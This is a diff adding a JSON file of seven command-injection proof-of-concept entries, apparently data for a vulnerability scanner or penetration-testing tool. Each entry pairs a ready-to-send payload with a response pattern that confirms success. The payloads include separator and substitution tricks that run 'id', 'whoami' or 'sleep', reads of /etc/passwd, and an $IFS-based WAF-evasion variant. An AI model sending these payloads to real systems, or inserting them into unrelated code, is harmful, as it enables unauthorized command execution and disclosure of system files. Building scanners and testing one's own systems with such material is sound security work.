@@ -1,0 +1,93 @@
+[
+    {
+        "poc_id": "cmdi-semicolon-001",
+        "vuln_type": "cmdi",
+        "title": "Command Injection via semicolon separator",
+        "tech_stack": ["php", "python"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "; id",
+        "expected_response": "uid=\\d+.*gid=\\d+",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Basic command injection using semicolon to chain OS commands"
+    },
+    {
+        "poc_id": "cmdi-pipe-002",
+        "vuln_type": "cmdi",
+        "title": "Command Injection via pipe operator",
+        "tech_stack": ["php", "python", "ruby"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "| cat /etc/passwd",
+        "expected_response": "root:x:0:0",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Pipe operator to redirect previous command output and run arbitrary commands"
+    },
+    {
+        "poc_id": "cmdi-backtick-003",
+        "vuln_type": "cmdi",
+        "title": "Command Injection via backtick substitution",
+        "tech_stack": ["php"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "`sleep 5`",
+        "expected_response": "response_time > 5s",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Backtick command substitution for time-based blind detection"
+    },
+    {
+        "poc_id": "cmdi-dollar-004",
+        "vuln_type": "cmdi",
+        "title": "Command Injection via $() substitution",
+        "tech_stack": ["php", "python"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "$(sleep 5)",
+        "expected_response": "response_time > 5s",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Dollar-sign subshell substitution for blind command execution"
+    },
+    {
+        "poc_id": "cmdi-newline-005",
+        "vuln_type": "cmdi",
+        "title": "Command Injection via newline character",
+        "tech_stack": ["python", "ruby", "php"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "%0aid",
+        "expected_response": "uid=\\d+.*gid=\\d+",
+        "waf_bypass": true,
+        "severity": "CRITICAL",
+        "description": "URL-encoded newline to break out of command context and inject"
+    },
+    {
+        "poc_id": "cmdi-windows-006",
+        "vuln_type": "cmdi",
+        "title": "Windows Command Injection via & operator",
+        "tech_stack": ["asp.net", "php"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": "& whoami",
+        "expected_response": "\\\\.*\\\\|AUTHORITY",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Windows cmd.exe command chaining via & operator"
+    },
+    {
+        "poc_id": "cmdi-waf-bypass-007",
+        "vuln_type": "cmdi",
+        "title": "Command Injection WAF bypass via variable expansion",
+        "tech_stack": ["php", "python"],
+        "cve_ids": [],
+        "cvss_score": 9.8,
+        "payload": ";c${IFS}a${IFS}t${IFS}/etc/passwd",
+        "expected_response": "root:x:0:0",
+        "waf_bypass": true,
+        "severity": "CRITICAL",
+        "description": "Using $IFS (Internal Field Separator) to replace spaces and evade WAF"
+    }
+]
